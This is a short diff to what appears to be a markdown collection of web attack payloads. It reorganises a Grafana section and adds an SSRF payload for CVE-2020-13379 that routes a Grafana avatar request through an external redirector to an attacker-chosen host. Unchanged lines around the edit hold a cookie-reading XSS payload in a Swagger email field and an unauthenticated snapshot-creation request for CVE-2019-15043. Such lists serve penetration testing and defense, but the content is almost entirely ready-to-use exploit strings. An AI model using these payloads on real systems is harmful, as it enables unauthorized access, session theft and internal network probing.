@@ -16,7 +16,13 @@ info:
     email: "javascript:alert(document.cookie)"
   version: "1.0.1"``
 
-**(CVE-2019-15043) Grafana unauthenticated API:**
+######Grafana:
+
+**(CVE-2019-15043) Unauthenticated API access:**
 
 ``POST /api/snapshots``
 ``{"dashboard": {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}``
+
+**(CVE-2020-13379) SSRF:**
+
+``/avatar/test%3fd%3dredirect.rhynorater.com%25253f%253b%252fbp.blogspot.com%252fYOURHOSTHERE``
